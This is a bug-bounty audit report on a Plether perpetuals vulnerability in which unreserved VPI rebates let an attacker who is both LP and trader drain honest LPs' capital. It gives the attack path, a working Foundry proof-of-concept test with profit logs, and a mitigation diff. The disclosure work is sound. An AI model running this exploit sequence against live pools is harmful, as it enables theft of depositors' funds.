# \#98563 [SC-Critical] Unreserved VPI rebate lets an attacker-LP drain honest LP capital

**Submitted on Nov 8th 2026 at 17:54:29 UTC by @Bozwkd for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98563
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

# Summary

Close-time VPI action rebates and LP withdrawals use inconsistent liquidity reserves. LP withdrawals reserve current trader claims, maximum directional liability, and the settlement buffer, but they do **not** reserve a trader's accrued VPI rebate. When that trader later closes, the rebate is paid from cash above **existing trader claims only**, without protecting maximum liability or the buffer.

An account that is simultaneously an LP and a trader can use this asymmetry to extract more USDG than it contributes, at the direct expense of honest LPs. The attack needs **no price movement, no victim trader, and no liquidatable position**: it runs entirely at a single, unchanging mark equal to `CAP_PRICE`.

A SHORT opened at `CAP_PRICE` has zero maximum-profit liability while still charging VPI on its full notional. That VPI is booked as pool revenue and lifts junior NAV per share. The attacker-LP redeems at the inflated NAV (the withdrawal reserve ignores the pending rebate), then closes the SHORT and receives the rebate out of cash that now backs the honest LP. Because the mark never leaves `CAP_PRICE`, the attacker's SHORT stays exactly at its entry — equity equals its margin for the whole sequence — so it is never liquidatable and no permissionless keeper can interfere.

In the PoC, the attacker contributes `20,000,000e6` USDG as a Junior LP and `50,000e6` USDG of trading funding, and finishes with `20,053,841.645743` USDG: a verified net profit of **3,841.645743 USDG**. An honest Junior LP that contributed `5,000,000e6` USDG can afterward redeem only `4,992,968.932860` USDG, a loss of **7,031.067140 USDG**, for doing nothing but depositing.

The defect is not the claim-solvency gate. It is that normal LP and trading operations compose to move value from honest LPs to the attacker under a fully coherent single-oracle timeline.

# Root Cause

**RC1 (primary). LP withdrawal accounting does not reserve accrued VPI rebates.**

`HousePoolAccountingLib.buildWithdrawalSnapshot` reserves only current maximum liability, current trader claims, and supplemental buffer (`HousePoolAccountingLib.sol:51-54`):

```solidity
snapshot.reserved = engineSnapshot.maxLiabilityAssets + engineSnapshot.traderClaimBalanceAssets
    + engineSnapshot.supplementalReservedAssets;
snapshot.freeAssets =
    snapshot.physicalAssets > snapshot.reserved ? snapshot.physicalAssets - snapshot.reserved : 0;
```

A skew-increasing open records VPI as pool revenue, increasing pool cash and withdrawable LP value. The corresponding future close-time rebate is a real liability of the pool, yet it is absent from the withdrawal reserve. An LP can therefore withdraw the VPI revenue before the matching rebate is ever reserved.

This is the element with no analog in the existing scan report. The known fee-top-up finding (MED-6) treats this very withdrawal reserve as the gold-standard, complete reserve; it never contemplates that the reserve omits the accrued rebate, nor a profiting attacker.

**RC2 (amplifier). Close-time action rebates protect claims but not position liabilities.**

After netting a fresh price payout, `CfdEnginePlanLib` funds the rebate using only post-netting aggregate trader claims (`CfdEnginePlanLib.sol:971-978`):

```solidity
freePoolCashAssets =
    CashPriorityLib.reserveFreshPayouts(poolCashAfterCollectionsAssets, claimsAfterPriceNettingAssets)
    .freeCashAssets;
if (delta.actionRebateAssets > 0) {
    delta.actionRebatePaidAssets =
        delta.actionRebateAssets < freePoolCashAssets ? delta.actionRebateAssets : freePoolCashAssets;
    delta.actionRebateWaivedAssets = delta.actionRebateAssets - delta.actionRebatePaidAssets;
    poolCashAfterCollectionsAssets -= delta.actionRebatePaidAssets;
}
```

`CashPriorityLib.reserveFreshPayouts` subtracts only `traderClaimBalanceAssets` (`CashPriorityLib.sol:27-41`). It does not subtract maximum liability, the settlement buffer, pending claimant buckets, or unassigned assets. With no winning trader present, aggregate claims are zero, so the rebate floor is the **entire remaining pool cash** — including the honest LP's reserved backing and the buffer.

This differs from the protocol-fee top-up path, which uses the fuller liability-aware reserve through `_freePoolCashAfterLiabilityReserves` (`CfdEnginePlanLib.sol:1022`). The settlement sidecar executes the rebate as an actual pool payout (`CfdEngineSettlementSidecar.sol:443`):

```solidity
IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets);
```

RC1 and RC2 compose: RC1 lets LP cash leave while the rebate is unreserved, and RC2 then pays the rebate out of the remaining liability reserve.

**A zero-liability SHORT at `CAP_PRICE` supplies the rebate without adding liability.**

For a SHORT, maximum profit is `lots × CAP_PRICE − entryCostAssetAtoms` (`CfdMath.sol:85-89`). Opening at `CAP_PRICE` makes `entryCost = lots × CAP_PRICE`, so maximum-profit liability is exactly zero while the position's full notional still increases skew and charges VPI. This is compatible with the deployed `vpiFactorWad = 0.01e18` and `maxSkewRatioWad = 0.4e18`; no elevated VPI factor or skew limit is required.

**The attack needs no price movement and no liquidation.**

`updateMarkPrice` merely clamps the mark at `CAP_PRICE` (`CfdEngine.sol:208`); reaching the cap is not a terminal trigger, and `degradedMode` latches only on detected insolvency. The entire sequence therefore runs at a constant mark equal to `CAP_PRICE`. The only open position is the attacker's SHORT, held exactly at its entry price, so its equity equals its margin at every step and it is never liquidatable. There is no oracle oscillation to reproduce and no window for an in-scope permissionless keeper to act.

# Attack Path

1. An honest LP funds a Junior position, supplying real reserved capital.
2. The attacker funds a large Junior LP position (which also provides the depth that admits the skew-increasing SHORT) and a separate trading account.
3. The attacker opens a skew-increasing SHORT at `CAP_PRICE`. The position adds zero maximum-profit liability but charges VPI on its full notional, booked as pool revenue that lifts Junior NAV per share.
4. The attacker requests redemption of its Junior shares through a valid LP epoch settlement and claims them at the VPI-inflated NAV. Withdrawal accounting reserves current claims, maximum liability, and buffer, but not the accrued close-time rebate (RC1).
5. The attacker closes the SHORT at `CAP_PRICE`. Price PnL is zero, but the negative VPI delta produces an action rebate. With no winning trader, aggregate claims are zero, so the rebate floor is all remaining pool cash and the payout consumes the honest LP's backing (RC2).
6. The attacker withdraws its clearinghouse balance. Its LP redemption plus trading proceeds exceed its combined LP and trading principal.
7. The honest LP's redeemable value is now below its contributed principal.

The mark never changes, so no position is liquidatable at any point. The attack requires no oracle corruption, reentrancy, malicious token, storage manipulation, compromised role, or cooperating victim trader.

# Impact

**High — Direct theft of LP funds.**

The attacker realizes a positive net return funded by honest LP capital, through valid protocol operations, under the documented release configuration. The positive net return rules out a griefing-only interpretation or a mere withdrawal of the attacker's own capital.

The extractable amount scales with the VPI revenue the attacker can book (a function of notional, `vpiFactor`, skew limit, and pool depth) and with the reserved cash available to the rebate floor. The PoC is a conservative instance, not an upper bound.

Under adverse price paths the same reserve asymmetry can additionally force a winning trader's payout into an undercovered claim and freeze claim settlement while `pool.totalAssets() < totalTraderClaimBalanceAssets`. That escalation requires price movement and a surviving winning position, so it is weaker than the static-mark theft demonstrated here and is noted only as a secondary consequence.

# PoC

**Direct-profit, single-oracle PoC:** `packages/perps/test/perps/accounting/cash-priority/VpiRebateConstantCapTheft.t.sol`

The PoC uses the production engine, planner, settlement sidecar, clearinghouse, HousePool, and tranche-vault stack at a constant mark equal to `CAP_PRICE`. Direct router-authorized engine calls isolate settlement economics from queue timing.

Deployment-aligned parameters:

- `vpiFactor = 0.01e18`;
- `maxSkewRatio = 0.4e18`;
- maintenance margin `10` bps and initial margin `20` bps;
- FAD margin `300` bps;
- base carry `500` bps;
- execution fee `4` bps;
- `10,000e6` Senior and Junior seed positions;
- Senior share limit `8,000` bps.

Scenario:

- An honest LP contributes `5,000,000e6` USDG to the Junior tranche.
- The attacker contributes `20,000,000e6` USDG as a Junior LP and `50,000e6` USDG as trading funding.
- The attacker opens a `4,004,000e18` SHORT at `CAP_PRICE`, adding zero maximum-profit liability but charging VPI on its full notional.
- The attacker redeems its Junior shares at the VPI-inflated NAV, then closes the SHORT at `CAP_PRICE` and withdraws its clearinghouse balance.
- The mark is held at `CAP_PRICE` for the entire test.

Run with:

```bash
forge test --offline --root packages/perps \
  --match-path test/perps/accounting/cash-priority/VpiRebateConstantCapTheft.t.sol -vv
```

Observed result:

```text
[PASS] test_VpiRebateDrainIsProfitableAtConstantCapWithoutVictim()
Logs:
  attacker LP funding: 20000000000000
  attacker trading funding: 50000000000
  attacker redeemed LP assets: 20010248045743
  attacker clearinghouse proceeds: 43593600000
  attacker final assets: 20053841645743
  attacker net profit: 3841645743
  honest LP funding: 5000000000000
  honest LP redeemable after attack: 4992968932860
  honest LP net: -7031067140
Suite result: ok. 1 passed; 0 failed
```

Converted to USDG:

| Component | Result |
|---|---:|
| Attacker LP funding | 20,000,000.000000 |
| Attacker trading funding | 50,000.000000 |
| Attacker combined principal | 20,050,000.000000 |
| Attacker LP redemption | 20,010,248.045743 |
| Attacker clearinghouse proceeds (rebate) | 43,593.600000 |
| Attacker final assets | 20,053,841.645743 |
| **Attacker net profit** | **3,841.645743** |
| Honest LP funding | 5,000,000.000000 |
| Honest LP redeemable after attack | 4,992,968.932860 |
| **Honest LP net** | **−7,031.067140** |

The attacker's profit is smaller than the honest LP's loss because part of the extracted value leaks to the execution fee, keeper bounty, and the Senior tranche. The attacker's net return is nonetheless strictly positive, and the honest LP is strictly harmed, under an uncontested single-oracle timeline.

# Mitigation

Apply the full post-close liability reserve to action rebates, not only the existing-claims reserve.

The rebate calculation should use the same reserve components as the protocol-fee top-up path, evaluated against **post-close** maximum liability so that liability removed by the current close remains available for the rebate:

```diff
-    freePoolCashAssets =
-        CashPriorityLib.reserveFreshPayouts(poolCashAfterCollectionsAssets, claimsAfterPriceNettingAssets)
-    .freeCashAssets;
+    // Compute cash above claims, remaining maximum liability, settlement buffer,
+    // pending claimant buckets, and unassigned assets.
+    freePoolCashAssets = _freePoolCashAfterLiabilityReserves(
+        snap,
+        poolCashAfterCollectionsAssets,
+        SolvencyAccountingLib.getMaxLiabilityAfterClose(
+            snap.longSide.maxProfitAssets,
+            snap.shortSide.maxProfitAssets,
+            delta.side,
+            delta.posMaxProfitReduction
+        ),
+        claimsAfterPriceNettingAssets,
+        /* newly queued revenue reserve, matching live HousePool accounting */
+        0
+    );
```

Any unaffordable rebate portion should continue through the existing `actionRebateWaivedAssets` path. Rebates must not become trader claims or protocol debt.

## Proof of Concept

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// @dev Coherent single-oracle variant of the VPI rebate drain. The entire attack runs at a constant
///      mark == CAP_PRICE, so no position ever moves against its entry and nothing is liquidatable. There is
///      no trading victim and no oracle oscillation: the only counterparty is an honest junior LP whose
///      reserved capital backs the pool. This isolates RC1 (the LP withdrawal reserve omits the accrued VPI
///      rebate) from the oscillation/liquidation objections that sink the dual-price PoC.
contract VpiRebateConstantCapTheftTest is BasePerpTest {
    address private constant ATTACKER = address(0xA77AC1);
    address private constant HONEST_LP = address(0x400D1b);

    uint256 private constant ATTACKER_SIZE = 4_004_000e18;
    uint256 private constant ATTACKER_TRADING_FUNDING = 50_000e6;
    uint256 private constant ATTACKER_LP_FUNDING = 20_000_000e6;
    uint256 private constant HONEST_LP_FUNDING = 5_000_000e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5_000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 10_000e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 10_000e6;
    }

    function test_VpiRebateDrainIsProfitableAtConstantCapWithoutVictim() public {
        _setSeniorCapacity(40_000_000e6, 8_000);

        // Pin the oracle at CAP for the entire attack. Every subsequent mark update reuses this value, so no
        // position is ever marked against a moved price and none can be liquidated.
        vm.prank(address(router));
        engine.updateMarkPrice(CAP_PRICE, uint64(vm.getBlockTimestamp()));

        // An honest LP supplies real reserved capital alongside the attacker's LP leg.
        _fundJunior(HONEST_LP, HONEST_LP_FUNDING);
        _fundJunior(ATTACKER, ATTACKER_LP_FUNDING);

        uint256 honestShares = juniorVault.balanceOf(HONEST_LP);

        // Attacker opens a zero-liability SHORT at CAP: maxProfit = lots*CAP - lots*CAP = 0, but it is
        // skew-increasing and books VPI into the pool as revenue, inflating junior NAV per share.
        _fundTrader(ATTACKER, ATTACKER_TRADING_FUNDING);
        _open(ATTACKER, CfdTypes.Side.SHORT, ATTACKER_SIZE, ATTACKER_TRADING_FUNDING, CAP_PRICE);

        // Attacker redeems its junior shares at the VPI-inflated NAV, before any rebate is reserved (RC1).
        uint256 redeemShares = juniorVault.balanceOf(ATTACKER);
        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN());
        vm.prank(ATTACKER);
        uint256 redeemRequestId = juniorVault.requestRedeem(redeemShares, ATTACKER, ATTACKER);

        vm.warp(juniorVault.depositEpochStart(redeemRequestId));
        vm.prank(address(router));
        engine.updateMarkPrice(CAP_PRICE, uint64(vm.getBlockTimestamp()));
        _settleLpEpochForTest();

        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemRequestId, ATTACKER);
        vm.prank(ATTACKER);
        uint256 redeemedAssets = juniorVault.claimRedeem(redeemRequestId, claimableShares, ATTACKER, ATTACKER);

        // Attacker closes the SHORT at CAP: zero price PnL, but the negative VPI delta pays an action rebate
        // out of pool cash that now belongs to the honest LP's reserved backing (RC2).
        _close(ATTACKER, CfdTypes.Side.SHORT, ATTACKER_SIZE, CAP_PRICE);

        uint256 clearinghouseBalance = clearinghouse.balanceAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, clearinghouseBalance);

        uint256 finalAssets = settlementToken.balanceOf(ATTACKER);
        uint256 totalFunding = ATTACKER_LP_FUNDING + ATTACKER_TRADING_FUNDING;

        // What the honest LP could now redeem for its still-held shares, priced at the same mark.
        uint256 honestRedeemable = juniorVault.convertToAssets(honestShares);

        emit log_named_uint("attacker LP funding", ATTACKER_LP_FUNDING);
        emit log_named_uint("attacker trading funding", ATTACKER_TRADING_FUNDING);
        emit log_named_uint("attacker redeemed LP assets", redeemedAssets);
        emit log_named_uint("attacker clearinghouse proceeds", clearinghouseBalance);
        emit log_named_uint("attacker final assets", finalAssets);
        emit log_named_int("attacker net profit", int256(finalAssets) - int256(totalFunding));
        emit log_named_uint("honest LP funding", HONEST_LP_FUNDING);
        emit log_named_uint("honest LP redeemable after attack", honestRedeemable);
        emit log_named_int("honest LP net", int256(honestRedeemable) - int256(HONEST_LP_FUNDING));

        assertGt(finalAssets, totalFunding, "constant-CAP chain must be directly profitable without a victim");
    }
}
```
